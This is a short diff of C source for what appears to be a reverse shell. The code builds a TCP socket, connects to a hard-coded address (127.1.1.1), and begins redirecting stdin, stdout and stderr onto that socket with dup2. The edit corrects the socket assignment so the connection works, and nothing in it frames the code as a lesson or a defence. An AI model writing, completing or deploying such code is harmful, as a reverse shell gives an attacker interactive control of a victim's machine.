@@ -13,12 +13,13 @@ int main() {
     server.sin_addr.s_addr = inet_addr("127.1.1.1");
 
     // create a socket
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    socket(AF_INET, SOCK_STREAM, 6);
+    // sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    sockfd = socket(AF_INET, SOCK_STREAM, 6);
 
 
     // remote host connection
     connect(sockfd, (struct sockaddr *)&server, sizeof(server));
+    // connect(socket(AF_INET, SOCK_STREAM, 6), (struct sockaddr *)&server, sizeof(server));
 
     // stdin, stdout, and stderr to the socket
     dup2(sockfd, 0);
